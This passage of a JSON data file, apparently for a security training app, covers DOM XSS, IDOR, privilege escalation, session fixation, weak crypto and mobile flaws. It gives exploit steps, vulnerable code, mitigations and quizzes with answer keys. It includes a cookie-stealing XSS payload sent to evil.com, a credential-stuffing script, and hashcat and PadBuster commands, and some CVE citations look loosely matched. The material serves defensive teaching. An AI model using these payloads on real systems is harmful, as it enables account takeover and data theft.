        "question": "Why is stored XSS generally more dangerous than reflected XSS?",
        "options": [
          "It executes for every user who views the infected content, not just one tricked victim",
          "It only works on mobile browsers",
          "It bypasses TLS",
          "It cannot be detected by any scanner"
        ],
        "answer": 0
      },
      {
        "question": "Where should output encoding be applied to reliably prevent stored XSS?",
        "options": [
          "At render/output time, not just at input validation time",
          "Only in the database layer",
          "Only in the URL",
          "Only on the login page"
        ],
        "answer": 0
      },
      {
        "question": "What's a common high-value target for stored XSS payloads?",
        "options": [
          "Admin-viewed pages like support tickets or flagged content, to escalate to admin takeover",
          "The favicon",
          "The robots.txt file",
          "The DNS TTL"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "DOM-Based Cross-Site Scripting (XSS)",
    "category": "Client-Side",
    "severity": "High",
    "definition": "Client-side JavaScript writes attacker-controlled data into the DOM via an unsafe sink, without the payload ever touching the server.",
    "theory": "DOM XSS happens entirely in the browser: a 'source' (like location.hash or document.URL) is read and passed to a dangerous 'sink' (like innerHTML or eval) without sanitization, so the server-side code may look perfectly safe while the page is still exploitable.",
    "cve": "CVE-2020-6519 (Chromium CSP bypass enabling DOM XSS)",
    "exploit": "1. Find JS that reads location.hash or similar and writes to innerHTML.\n2. Craft a URL: page.html#<img src=x onerror=alert(1)>.\n3. Victim clicks the link; the client-side script executes the payload without any server round-trip.",
    "example": {
      "scenario": "A single-page app reads a 'welcome name' from the URL fragment and injects it directly into the page via innerHTML; because the fragment never reaches the server, traditional server-side XSS filters never see the payload at all.",
      "code": "// Vulnerable client-side JS\nconst name = location.hash.slice(1);\ndocument.getElementById('greeting').innerHTML = 'Welcome, ' + name;\n\n// Malicious link sent to victim\nhttps://app.com/#<img src=x onerror=\"fetch('//evil.com?c='+document.cookie)\">"
    },
    "mitigation": "Avoid unsafe sinks (innerHTML, eval); use textContent or a sanitizer library; CSP.",
    "quizzes": [
      {
        "question": "What makes DOM-based XSS different from reflected/stored XSS?",
        "options": [
          "The malicious data flows entirely within client-side JavaScript and never touches the server",
          "It only affects Internet Explorer",
          "It requires admin privileges",
          "It only works over HTTP, not HTTPS"
        ],
        "answer": 0
      },
      {
        "question": "Which of these is considered a dangerous DOM 'sink'?",
        "options": [
          "innerHTML",
          "textContent",
          "console.log",
          "Array.map"
        ],
        "answer": 0
      },
      {
        "question": "Why might a server-side XSS filter completely miss a DOM XSS payload?",
        "options": [
          "Data passed via the URL fragment (#) is never sent to the server in the HTTP request",
          "DOM XSS payloads are always encrypted",
          "Server-side filters only check POST requests",
          "DOM XSS only happens on the first page load"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Insecure Direct Object Reference (IDOR)",
    "category": "Access Control",
    "severity": "High",
    "definition": "An application exposes a direct reference to an internal object (a file, record, or key) that a user can manipulate to access data belonging to someone else.",
    "theory": "IDOR is the classic, broader form of horizontal access-control failure: any place a raw identifier (filename, DB key, account number) is exposed to the client and used server-side without an ownership check is exploitable, not just REST API endpoints.",
    "cve": "CVE-2019-7644 (Ring doorbell IDOR)",
    "exploit": "1. Perform a normal action and note the object reference (e.g. invoice_id=4471, or filename user_4471.pdf).\n2. Change the reference to a neighboring value.\n3. If the server returns another user's data, ownership checks are missing.",
    "example": {
      "scenario": "A medical portal lets patients download their lab report via a direct link containing a sequential report ID; an attacker simply edits the number in the URL to read other patients' lab results.",
      "code": "// Vulnerable download endpoint\napp.get('/reports/:id/download', requireAuth, (req, res) => {\n  res.sendFile(`/reports/${req.params.id}.pdf`); // no check that req.user owns this report\n});\n\n// Attacker simply changes the ID\nGET /reports/40872/download   (while authenticated as the owner of report 40871)"
    },
    "mitigation": "Enforce server-side ownership checks on every object access; use unguessable, unpredictable identifiers as a defense-in-depth layer.",
    "quizzes": [
      {
        "question": "IDOR vulnerabilities arise because the server fails to check what?",
        "options": [
          "That the requesting user actually owns or is authorized to access the referenced object",
          "That the password is strong enough",
          "That the TLS certificate is valid",
          "That the request uses POST instead of GET"
        ],
        "answer": 0
      },
      {
        "question": "Besides API endpoints, where else can IDOR commonly appear?",
        "options": [
          "Direct file/document download links using sequential or guessable identifiers",
          "CSS stylesheets",
          "DNS records",
          "Favicon requests"
        ],
        "answer": 0
      },
      {
        "question": "Using random, unguessable IDs instead of sequential ones is best described as:",
        "options": [
          "A defense-in-depth measure, not a substitute for proper authorization checks",
          "A complete fix that makes authorization checks unnecessary",
          "Something that has no security benefit at all",
          "Only relevant for encryption, not access control"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Broken Function Level Authorization",
    "category": "Access Control",
    "severity": "Critical",
    "definition": "An API or app fails to verify that a user's role permits calling a particular function/endpoint, letting low-privileged users invoke admin-only actions.",
    "theory": "Unlike BOLA (object-level), this flaw is about the function/action itself — e.g. a regular user discovering and successfully calling DELETE /api/admin/users/{id} because the server never checks the caller's role for that route, only that they're logged in.",
    "cve": "OWASP API Security Top 10 — API5:2023",
    "exploit": "1. Map out admin-only endpoints (via JS source, API docs, or guesswork).\n2. Call them directly as a low-privileged authenticated user.\n3. If the server only checks 'is logged in' and not 'is admin', the action succeeds.",
    "example": {
      "scenario": "A SaaS dashboard hides the 'Delete Organization' button from regular users in the UI, but the underlying API endpoint never actually checks the caller's role — so a regular user can call it directly with a tool like curl and delete the entire organization.",
      "code": "// Vulnerable endpoint — checks login, not role\napp.delete('/api/org/:id', requireAuth, async (req, res) => {\n  await db.query('DELETE FROM organizations WHERE id=$1', [req.params.id]); // no role check!\n  res.json({ ok: true });\n});\n\n// Low-privileged user calls it directly, bypassing the UI entirely\ncurl -X DELETE https://app.com/api/org/55 -H \"Authorization: Bearer <regular-user-token>\""
    },
    "mitigation": "Enforce role/permission checks server-side on every sensitive endpoint, never rely on hiding UI elements alone.",
    "quizzes": [
      {
        "question": "Broken Function Level Authorization is primarily about checking what?",
        "options": [
          "Whether the user's role permits calling a specific action/endpoint",
          "Whether the user owns a specific object",
          "Whether the password meets complexity rules",
          "Whether the session has expired"
        ],
        "answer": 0
      },
      {
        "question": "Why is hiding an admin button in the UI not sufficient protection?",
        "options": [
          "The underlying API endpoint can still be called directly, bypassing the UI entirely",
          "UI elements are encrypted",
          "Browsers block hidden buttons from being clicked",
          "Hiding a button changes the server's authorization logic automatically"
        ],
        "answer": 0
      },
      {
        "question": "What's the correct fix for broken function level authorization?",
        "options": [
          "Enforce explicit role/permission checks on the server for every sensitive endpoint",
          "Rename the endpoint to something harder to guess",
          "Add more CSS to hide the feature",
          "Increase the session timeout"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Vertical & Horizontal Privilege Escalation",
    "category": "Access Control",
    "severity": "Critical",
    "definition": "An attacker gains access to functionality or data beyond their assigned privilege level — either by becoming a higher-privileged role (vertical) or by accessing another same-level user's resources (horizontal).",
    "theory": "Privilege escalation is the umbrella outcome of many flaws (mass assignment, BOLA, broken function-level auth). Vertical escalation = user becomes admin; horizontal escalation = user A accesses user B's data without becoming a different role.",
    "cve": "CVE-2021-3156 (Sudo Baron Samedit — vertical privilege escalation)",
    "exploit": "1. Identify a parameter or token claim tied to role/identity (role=user, user_id=441).\n2. Modify it directly (role=admin) or via a parallel flaw like mass assignment.\n3. Confirm elevated access by attempting an admin-only or another-user-only action.",
    "example": {
      "scenario": "A SaaS app's JWT includes the user's role as a plain claim that's never re-verified against the database server-side; an attacker decodes their token, changes 'role':'user' to 'role':'admin', re-signs it (or exploits a JWT flaw), and gains full administrative access.",
      "code": "// Original JWT payload\n{ \"sub\": \"user_441\", \"role\": \"user\" }\n\n// Tampered JWT payload (after exploiting a signature weakness, e.g. alg:none)\n{ \"sub\": \"user_441\", \"role\": \"admin\" }\n\n// Server trusts the role claim directly without re-checking the database\nif (decodedToken.role === 'admin') { /* grant admin access */ }"
    },
    "mitigation": "Re-verify role/permissions server-side from a trusted source on every request; never trust client-supplied role claims alone.",
    "quizzes": [
      {
        "question": "What distinguishes vertical from horizontal privilege escalation?",
        "options": [
          "Vertical means gaining a higher role; horizontal means accessing another same-level user's data",
          "Vertical only happens in mobile apps; horizontal only in web apps",
          "Vertical is always less severe than horizontal",
          "They are the same thing with different names"
        ],
        "answer": 0
      },
      {
        "question": "Why is trusting a role claim inside a JWT without server-side re-verification risky?",
        "options": [
          "If the token can be tampered with or forged, the attacker can simply claim a higher role",
          "JWTs cannot contain role information",
          "JWTs are always encrypted and unreadable",
          "This is never risky if HTTPS is used"
        ],
        "answer": 0
      },
      {
        "question": "What's a reliable defense against privilege escalation via tampered claims?",
        "options": [
          "Re-check the user's actual role/permissions against a trusted server-side source on every sensitive action",
          "Make the JWT longer",
          "Store the JWT in a cookie instead of localStorage",
          "Reduce the token expiry to 1 second"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Session Fixation",
    "category": "Auth & Session",
    "severity": "Medium",
    "definition": "An attacker sets or predicts a victim's session ID before login, so once the victim authenticates, the attacker's known session ID becomes a valid authenticated session.",
    "theory": "If an app doesn't regenerate the session ID upon successful login, an attacker can plant a known session token on the victim (via a link or cookie injection) and simply wait for them to log in, then reuse that same session ID to hijack the now-authenticated session.",
    "cve": "CVE-2014-6394 (Apache Tomcat session fixation)",
    "exploit": "1. Obtain a valid (unauthenticated) session ID from the target site.\n2. Send the victim a link embedding that session ID (?sessionid=ATTACKERKNOWN123).\n3. Victim logs in using that session.\n4. Attacker reuses the same session ID, now authenticated as the victim.",
    "example": {
      "scenario": "A site accepts a session ID via URL parameter and never issues a new one after login; an attacker sends a victim a link containing a session ID they already know, waits for the victim to log in through that link, then uses the same ID themselves to access the now-authenticated account.",
      "code": "// Vulnerable: app accepts attacker-supplied session ID and never regenerates it after login\napp.get('/login', (req, res) => {\n  if (req.query.sessionid) req.session.id = req.query.sessionid; // attacker-controlled!\n});\n// After successful login, the session ID is NOT regenerated\n\n// Phishing link sent to victim\nhttps://app.com/login?sessionid=ATTACKERKNOWN123"
    },
    "mitigation": "Regenerate the session ID immediately after successful authentication; never accept session IDs from URL parameters.",
    "quizzes": [
      {
        "question": "Session fixation relies on the attacker doing what before the victim logs in?",
        "options": [
          "Planting or predicting a known session ID on the victim",
          "Stealing the victim's password",
          "Intercepting TLS traffic",
          "Sending a malicious file attachment"
        ],
        "answer": 0
      },
      {
        "question": "What's the key server-side fix for session fixation?",
        "options": [
          "Regenerate the session ID immediately after successful login",
          "Use longer passwords",
          "Disable cookies entirely",
          "Add a CAPTCHA to the login form"
        ],
        "answer": 0
      },
      {
        "question": "Why is accepting a session ID from a URL parameter risky?",
        "options": [
          "It lets an attacker plant a session ID they already know directly via a link",
          "URLs are always encrypted",
          "It makes the page load faster",
          "It has no security implication"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Credential Stuffing & Brute Force",
    "category": "Auth & Session",
    "severity": "High",
    "definition": "Automated attempts to log in using large lists of leaked username/password pairs (credential stuffing) or systematic guessing (brute force), exploiting weak or absent rate limiting.",
    "theory": "Because many users reuse passwords across sites, attackers replay credentials leaked from one breach against many other login forms. Without rate limiting, account lockouts, or CAPTCHAs, this can be automated at massive scale with tools like Hydra or custom scripts.",
    "cve": "CVE-2021-26684 context (large-scale credential stuffing campaigns)",
    "exploit": "1. Obtain a leaked username:password list from a previous breach.\n2. Script automated login attempts against the target's login endpoint.\n3. Without rate limiting, harvest valid accounts where the password was reused.",
    "example": {
      "scenario": "A login endpoint has no rate limiting or lockout policy; an attacker feeds a list of 10 million leaked email:password pairs from an unrelated breach into a script, and successfully logs into thousands of accounts where users reused the same password.",
      "code": "# Attacker script (simplified)\nfor email, password in leaked_credentials_list:\n    r = requests.post('https://app.com/login', json={'email': email, 'password': password})\n    if r.status_code == 200:\n        print(f'Valid: {email}:{password}')\n# No CAPTCHA, no rate limit, no lockout -> millions of attempts succeed unnoticed"
    },
    "mitigation": "Rate limiting, account lockout/backoff, CAPTCHA after failures, breached-password detection, multi-factor authentication.",
    "quizzes": [
      {
        "question": "Credential stuffing relies on what common user behavior?",
        "options": [
          "Reusing the same password across multiple sites",
          "Using very long passwords",
          "Logging out after every session",
          "Using a password manager"
        ],
        "answer": 0
      },
      {
        "question": "Which control most directly stops automated mass login attempts?",
        "options": [
          "Rate limiting / account lockout after repeated failures",
          "A longer page load time",
          "Using a CDN",
          "Disabling HTTPS"
        ],
        "answer": 0
      },
      {
        "question": "What additional layer of defense makes stolen/guessed passwords alone insufficient to log in?",
        "options": [
          "Multi-factor authentication (MFA)",
          "A longer username",
          "A bigger database",
          "Disabling password resets"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Insecure Password Reset Logic",
    "category": "Auth & Session",
    "severity": "High",
    "definition": "Flaws in the 'forgot password' flow — predictable reset tokens, no expiry, or leaking tokens — allow an attacker to take over another user's account.",
    "theory": "Password reset is a high-value target because it bypasses the normal login entirely. Common flaws: predictable/sequential tokens, tokens that never expire, tokens leaked via Referer headers or logs, or reset flows that don't invalidate old sessions.",
    "cve": "CVE-2022-23131 (Zabbix SAML password reset bypass)",
    "exploit": "1. Trigger a password reset for the victim's account.\n2. If the token is short, sequential, or time-based, attempt to predict/brute-force it.\n3. Use the predicted token to set a new password and take over the account.",
    "example": {
      "scenario": "A site generates password reset tokens as a simple incrementing counter instead of a cryptographically random value; an attacker requests a reset for their own account to see the current token value, then simply increments it to guess the token issued for the victim moments later.",
      "code": "// Vulnerable token generation\nlet resetCounter = 100000;\nfunction generateResetToken() { return (resetCounter++).toString(); } // predictable!\n\n// Attacker requests their own reset, sees token=100042\n// Victim requests a reset moments later -> attacker guesses token=100043"
    },
    "mitigation": "Use cryptographically random, single-use, short-lived tokens; invalidate all sessions on password change.",
    "quizzes": [
      {
        "question": "What property must a password reset token have to be secure?",
        "options": [
          "Cryptographically random, single-use, and short-lived",
          "Short and easy to type",
          "Based on the user's email address",
          "Sequential for easy debugging"
        ],
        "answer": 0
      },
      {
        "question": "Why are predictable (e.g. sequential) reset tokens dangerous?",
        "options": [
          "An attacker can guess or compute another user's token by observing the pattern",
          "They expire too quickly",
          "They are always sent over HTTP",
          "They cannot be used more than once"
        ],
        "answer": 0
      },
      {
        "question": "What should happen to existing sessions after a successful password reset?",
        "options": [
          "All existing sessions should be invalidated",
          "Nothing, sessions should remain active",
          "Only the current session should be extended",
          "Sessions should be duplicated for backup"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Excessive Data Exposure (API)",
    "category": "API Security",
    "severity": "Medium",
    "definition": "An API returns more data than the client actually needs, relying on the front-end to filter it — exposing sensitive fields to anyone who inspects the raw response.",
    "theory": "Developers often return a full internal object from the database and let the UI pick which fields to display, assuming users will only see the filtered view. But the raw API response is fully visible via browser dev tools or a proxy, exposing fields like password hashes, internal flags, or other users' data never meant to be public.",
    "cve": "OWASP API Security Top 10 — API3:2023",
    "exploit": "1. Open browser dev tools / a proxy like Burp.\n2. Trigger a normal API call (e.g. load a user profile).\n3. Inspect the raw JSON response for fields not shown in the UI (password_hash, internal_notes, ssn).",
    "example": {
      "scenario": "A profile API endpoint returns the entire user database row — including the password hash and internal admin notes — and simply relies on the front-end to only display the name and avatar, but anyone inspecting network traffic sees everything.",
      "code": "// Vulnerable API response (full DB row returned)\n{\n  \"id\": 441, \"name\": \"Het\", \"avatar\": \"...\",\n  \"password_hash\": \"$2b$12$KIXQ...\",\n  \"internal_notes\": \"Flagged for chargeback review\",\n  \"ssn_last4\": \"1234\"\n}\n// UI only renders 'name' and 'avatar', but the full object is visible in dev tools / network tab"
    },
    "mitigation": "Explicitly define and return only the fields the client needs (response DTOs/serializers); never rely on the front-end to hide sensitive data.",
    "quizzes": [
      {
        "question": "Excessive data exposure happens because the API relies on what to hide sensitive fields?",
        "options": [
          "The front-end UI filtering what it displays",
          "TLS encryption",
          "Database indexing",
          "Rate limiting"
        ],
        "answer": 0
      },
      {
        "question": "How can sensitive fields exposed via this flaw be discovered by an attacker?",
        "options": [
          "Inspecting the raw API response via browser dev tools or a proxy",
          "Brute-forcing the password",
          "Sending malformed packets",
          "Scanning open ports"
        ],
        "answer": 0
      },
      {
        "question": "What's the correct fix for excessive data exposure?",
        "options": [
          "Define explicit response schemas/DTOs server-side that only include necessary fields",
          "Encrypt the entire response body",
          "Compress the JSON response",
          "Use a faster database"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Unrestricted Resource Consumption (API Rate Limiting)",
    "category": "API Security",
    "severity": "High",
    "definition": "An API lacks limits on request volume, payload size, or resource-intensive operations, letting a single client exhaust server resources or rack up costs.",
    "theory": "Without limits on requests per minute, response page sizes, or expensive operations (large exports, image resizing, AI inference), a single attacker — or even an inefficient legitimate client — can cause denial of service or runaway cloud billing.",
    "cve": "OWASP API Security Top 10 — API4:2023",
    "exploit": "1. Identify an expensive operation exposed via the API (bulk export, image processing, search with no pagination limit).\n2. Send many concurrent requests or request very large payloads/result sets.\n3. Observe degraded performance, errors, or unexpectedly high cloud costs.",
    "example": {
      "scenario": "A 'generate PDF report' API endpoint has no limit on date range or concurrent requests; an attacker scripts thousands of concurrent requests for multi-year reports, exhausting server CPU and spiking the company's cloud compute bill.",
      "code": "// Vulnerable endpoint — no limits on range or concurrency\napp.get('/api/report', requireAuth, async (req, res) => {\n  const report = await generateHeavyPdfReport(req.query.from, req.query.to); // no max range, no rate limit\n  res.send(report);\n});\n\n// Attacker script fires hundreds of concurrent huge-range requests\nfor (let i = 0; i < 500; i++) fetch('/api/report?from=2015-01-01&to=2026-01-01');"
    },
    "mitigation": "Enforce rate limits, pagination caps, payload size limits, and timeouts on expensive operations.",
    "quizzes": [
      {
        "question": "What kind of harm does unrestricted resource consumption typically cause?",
        "options": [
          "Denial of service or runaway cloud costs from resource exhaustion",
          "Data corruption in the database",
          "Permanent account lockout",
          "TLS certificate expiry"
        ],
        "answer": 0
      },
      {
        "question": "Which controls help prevent this category of API abuse?",
        "options": [
          "Rate limits, pagination caps, and payload size limits",
          "Longer session tokens",
          "More descriptive error messages",
          "Disabling logging"
        ],
        "answer": 0
      },
      {
        "question": "Why can even a single legitimate-looking client cause harm here?",
        "options": [
          "A single client can request an arbitrarily large or expensive operation if no limits are enforced",
          "Single clients are always malicious",
          "This only happens with multiple clients, never one",
          "It requires a botnet to be exploitable at all"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Weak Cryptographic Storage",
    "category": "Cryptography",
    "severity": "Critical",
    "definition": "Sensitive data (passwords, tokens, PII) is stored using outdated, weak, or no encryption/hashing, making it trivial to recover if the storage is breached.",
    "theory": "Using fast general-purpose hashes (MD5, SHA-1) for passwords, reversible encryption where hashing is appropriate, or storing secrets in plaintext all mean a single database leak instantly compromises all user credentials, since these algorithms are either crackable at scale or trivially reversible.",
    "cve": "CVE-2012-3499 (Apache mod_status — but widely cited alongside the LinkedIn 2012 SHA-1 password breach)",
    "exploit": "1. Obtain a leaked database dump.\n2. Identify the hashing algorithm (MD5 hashes are 32 hex chars, unsalted SHA-1 is fast to crack).\n3. Run the hashes through hashcat with rainbow tables / wordlists to recover plaintext passwords at scale.",
    "example": {
      "scenario": "A company stores user passwords as unsalted MD5 hashes; after a database breach, an attacker runs the entire dump through hashcat with a known rainbow table and recovers the vast majority of plaintext passwords within hours.",
      "code": "// Vulnerable password storage\nconst hash = crypto.createHash('md5').update(password).digest('hex'); // weak, fast, unsalted\n\n// Attacker cracking command\n$ hashcat -m 0 -a 0 leaked_hashes.txt rockyou.txt\n# MD5 hashes crack at billions of guesses/sec on a modern GPU"
    },
    "mitigation": "Use slow, salted password hashing (bcrypt, scrypt, Argon2); encrypt sensitive data at rest with modern authenticated ciphers (AES-GCM) and proper key management.",
    "quizzes": [
      {
        "question": "Which algorithm is appropriate for securely storing passwords?",
        "options": [
          "bcrypt / Argon2 / scrypt",
          "MD5",
          "SHA-1",
          "Base64 encoding"
        ],
        "answer": 0
      },
      {
        "question": "Why are MD5 and unsalted SHA-1 considered weak for password storage today?",
        "options": [
          "They are fast to compute, making large-scale brute-force/rainbow-table cracking feasible on modern hardware",
          "They are illegal to use",
          "They produce outputs that are too short to store",
          "They require internet access to compute"
        ],
        "answer": 0
      },
      {
        "question": "What is 'salting' in the context of password hashing?",
        "options": [
          "Adding a unique random value to each password before hashing, so identical passwords don't produce identical hashes",
          "Encrypting the password twice",
          "Storing the password in a separate database",
          "Using a shorter password"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Padding Oracle Attack",
    "category": "Cryptography",
    "severity": "High",
    "definition": "A server that reveals whether decrypted ciphertext has valid padding (via distinct errors or timing) allows an attacker to decrypt data byte-by-byte without knowing the key.",
    "theory": "Block ciphers in CBC mode use padding schemes (like PKCS#7). If a server responds differently for 'padding invalid' versus 'padding valid but content wrong', an attacker can manipulate ciphertext bytes and use the oracle's responses to decrypt (or even forge) data without ever recovering the encryption key itself.",
    "cve": "CVE-2014-3566 (POODLE)",
    "exploit": "1. Find an endpoint that decrypts an attacker-supplied ciphertext (e.g. an encrypted session cookie or viewstate).\n2. Modify ciphertext bytes and observe whether the server's error response differs for padding failures vs. other failures.\n3. Use tools like PadBuster to automate byte-by-byte decryption using the oracle.",
    "example": {
      "scenario": "A web app encrypts a session token using CBC mode and returns a distinct 'invalid padding' error message versus a generic error for other failures; an attacker uses this difference as an oracle to decrypt the entire token without ever knowing the encryption key.",
      "code": "// Vulnerable error handling — leaks padding validity\ntry {\n  const plaintext = decryptCBC(ciphertext, key);\n} catch (e) {\n  if (e.message === 'invalid padding') return res.status(400).send('Bad padding'); // distinct error!\n  return res.status(400).send('Decryption failed');\n}\n\n// Attacker uses PadBuster, flipping bytes and watching which error comes back\n$ padbuster https://app.com/decrypt <ciphertext> 16 -error 'Bad padding'"
    },
    "mitigation": "Use authenticated encryption (AES-GCM) instead of unauthenticated CBC; return identical generic errors regardless of the failure reason.",
    "quizzes": [
      {
        "question": "A padding oracle attack exploits what kind of leak?",
        "options": [
          "A distinguishable difference in server response for valid vs. invalid padding",
          "A leaked source code repository",
          "A weak password policy",
          "An open network port"
        ],
        "answer": 0
      },
      {
        "question": "What modern cipher mode prevents padding oracle attacks by design?",
        "options": [
          "Authenticated encryption like AES-GCM",
          "ECB mode",
          "Unauthenticated CBC mode",
          "ROT13"
        ],
        "answer": 0
      },
      {
        "question": "What server-side practice helps prevent padding oracle attacks even when using CBC?",
        "options": [
          "Returning identical, generic error messages regardless of why decryption failed",
          "Returning very detailed error messages for debugging",
          "Logging the encryption key on error",
          "Disabling HTTPS"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Insecure Randomness (Weak PRNG)",
    "category": "Cryptography",
    "severity": "High",
    "definition": "Security-critical values (tokens, session IDs, password reset codes) are generated using a non-cryptographic random number generator, making them predictable.",
    "theory": "General-purpose PRNGs (like Math.random() in JavaScript or rand() in C) are designed for speed and statistical distribution, not unpredictability — their internal state can often be inferred from observed outputs, letting an attacker predict future 'random' values used for security tokens.",
    "cve": "CVE-2018-1000620 context (predictable token generation issues)",
    "exploit": "1. Identify a security token generated from a weak source (Math.random(), time-based seed).\n2. Collect several sample tokens.\n3. Analyze/reproduce the PRNG's internal state to predict future tokens (session IDs, reset codes).",
    "example": {
      "scenario": "A password reset feature generates its 6-digit verification code using Math.random() seeded by the current timestamp; an attacker who can narrow down the approximate request time can brute-force or reproduce the exact PRNG output to predict the victim's code.",
      "code": "// Vulnerable token generation\nfunction generateResetCode() {\n  return Math.floor(Math.random() * 1000000).toString().padStart(6, '0'); // NOT cryptographically secure\n}\n\n// Math.random() is deterministic given the same internal engine state —\n// an attacker can sometimes reconstruct that state from observed outputs"
    },
    "mitigation": "Use a cryptographically secure random number generator (crypto.randomBytes in Node, secrets module in Python) for any security-sensitive value.",
    "quizzes": [
      {
        "question": "Why are general-purpose PRNGs like Math.random() unsuitable for security tokens?",
        "options": [
          "They are not designed to be unpredictable and their internal state can sometimes be inferred from outputs",
          "They are too slow to use in production",
          "They only generate even numbers",
          "They require a network connection"
        ],
        "answer": 0
      },
      {
        "question": "Which Node.js API should be used instead of Math.random() for generating secure tokens?",
        "options": [
          "crypto.randomBytes",
          "Date.now()",
          "Math.floor",
          "Array.sort"
        ],
        "answer": 0
      },
      {
        "question": "What kind of values are most at risk from insecure randomness?",
        "options": [
          "Session IDs, password reset codes, and other security-critical tokens",
          "CSS class names",
          "Image file names",
          "Log timestamps"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Insecure Data Storage (Mobile)",
    "category": "Mobile",
    "severity": "High",
    "definition": "A mobile app stores sensitive data (tokens, credentials, PII) in an unprotected location on the device, readable by other apps or anyone with physical/root access.",
    "theory": "Mobile apps that write sensitive data to plaintext files, unencrypted SQLite databases, or insecure shared preferences leave that data exposed to malware with storage permissions, or to anyone who gains physical access to a rooted/jailbroken device.",
    "cve": "OWASP Mobile Top 10 — M9: Insecure Data Storage",
    "exploit": "1. Root/jailbreak a test device or use an emulator.\n2. Pull the app's data directory (adb pull /data/data/com.app/).\n3. Inspect SharedPreferences XML files, SQLite DBs, or cache files for plaintext tokens, passwords, or PII.",
    "example": {
      "scenario": "A banking app caches the user's auth token and account balance in a plaintext SharedPreferences XML file; anyone with a rooted device (or a forensic extraction tool) can pull the file directly and read the data without ever touching the app's UI.",
      "code": "// Vulnerable Android code\nSharedPreferences prefs = getSharedPreferences(\"app_prefs\", MODE_PRIVATE);\nprefs.edit().putString(\"auth_token\", token).putString(\"balance\", balance).apply(); // stored in plaintext XML\n\n// Attacker with root access\n$ adb pull /data/data/com.bankapp/shared_prefs/app_prefs.xml\n$ cat app_prefs.xml   # auth_token and balance visible in plaintext"
    },
    "mitigation": "Use platform secure storage (Android Keystore / iOS Keychain), encrypt sensitive data at rest, avoid caching sensitive data unnecessarily.",
    "quizzes": [
      {
        "question": "Where should sensitive mobile app data (tokens, credentials) be stored?",
        "options": [
          "Platform secure storage like Android Keystore or iOS Keychain",
          "Plain SharedPreferences/NSUserDefaults",
          "A world-readable cache file",
          "The app's log files"
        ],
        "answer": 0
      },
      {
        "question": "How can an attacker typically access insecurely stored data on a mobile device?",
        "options": [
          "By rooting/jailbreaking the device or using forensic extraction tools to read the app's data directory",
          "By guessing the app's password remotely",
          "By scanning open network ports",
          "By sending a phishing SMS"
        ],
        "answer": 0
      },
      {
        "question": "What's a good general practice regarding sensitive data and mobile apps?",
        "options": [
          "Avoid caching sensitive data on-device unless absolutely necessary, and encrypt it when you do",
          "Cache as much data as possible for performance",
          "Store all data in app logs for debugging",
          "Disable the device's screen lock requirement"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Insecure Mobile WebView Configuration",
    "category": "Mobile",
    "severity": "High",
    "definition": "A mobile app's embedded WebView is configured with overly permissive settings (JavaScript bridges, file access, mixed content), letting malicious web content escalate into native app compromise.",
    "theory": "WebViews that expose native JavaScript interfaces (addJavascriptInterface on Android) to untrusted web content, or that allow loading arbitrary/mixed-content URLs, let an attacker who controls a loaded page call native app functions directly — potentially reading files, accessing contacts, or executing code.",
    "cve": "CVE-2012-6636 (Android addJavascriptInterface RCE)",
    "exploit": "1. Identify an app loading attacker-influenced content in a WebView (e.g. via a deep link or ad network).\n2. If a native JS bridge is exposed, call its methods directly from injected JavaScript.\n3. Use the bridge to access native functionality (read files, get device info, etc.) from purely web-based code.",
    "example": {
      "scenario": "An app exposes a native Java object to its WebView via addJavascriptInterface, allowing any JavaScript running inside that WebView — including from a malicious ad or a man-in-the-middle-injected page — to directly call native methods like reading local files.",
      "code": "// Vulnerable Android code\nwebView.getSettings().setJavaScriptEnabled(true);\nwebView.addJavascriptInterface(new NativeBridge(), \"AndroidBridge\"); // exposed to ALL loaded content\n\n// Malicious JS loaded via a compromised ad network inside the WebView\nAndroidBridge.readFile('/data/data/com.app/shared_prefs/app_prefs.xml');"
    },
    "mitigation": "Avoid exposing native JS bridges to untrusted content, validate/restrict URLs the WebView can load, disable file access and mixed content where not needed.",
    "quizzes": [
      {
        "question": "What Android API, if misused, can expose native app functionality to untrusted web content?",
        "options": [
          "addJavascriptInterface",
          "setContentView",
          "startActivity",
          "onCreate"
        ],
        "answer": 0
      },
      {
        "question": "Why is exposing a JS bridge to a WebView risky if the WebView can load arbitrary content?",
        "options": [
          "Any JavaScript running in the WebView — including from malicious or compromised content — can call the native bridge methods directly",
          "It slows down the app",
          "It only affects iOS, not Android",
          "It has no security implication if HTTPS is used"
        ],
        "answer": 0
      },
      {
        "question": "What's a key mitigation for insecure WebView configurations?",
        "options": [
          "Restrict which URLs the WebView can load and avoid exposing native bridges to untrusted content",
          "Always enable JavaScript and file access for compatibility",
          "Disable HTTPS to simplify debugging",
          "Increase the WebView's cache size"
        ],
        "answer": 0
      }
    ]
  },
  {
    "name": "Hardcoded Secrets in Mobile Apps",
    "category": "Mobile",
    "severity": "Critical",
    "definition": "API keys, credentials, or signing secrets are embedded directly in a mobile app's compiled code, where they can be extracted by anyone who decompiles the app.",
    "theory": "Mobile app binaries (APK/IPA) can be trivially decompiled with free tools, so any secret embedded in the code — cloud API keys, backend credentials, encryption keys — is effectively public the moment the app is published, regardless of obfuscation.",
    "cve": "Widespread issue documented across multiple mobile security research reports (e.g. cloud key leakage studies)",
    "exploit": "1. Download the target app's APK/IPA.\n2. Decompile it with a tool like jadx or apktool.\n3. Search the decompiled source/strings for API keys, tokens, or credentials (grep for 'key', 'secret', 'AKIA', etc.).\n4. Use the recovered key against the associated cloud service.",
    "example": {
      "scenario": "A mobile app embeds its cloud storage provider's full-access API key directly in the app's source code 'for convenience'; a security researcher decompiles the publicly available APK in minutes and finds the key in plaintext, gaining full read/write access to the company's cloud storage bucket.",
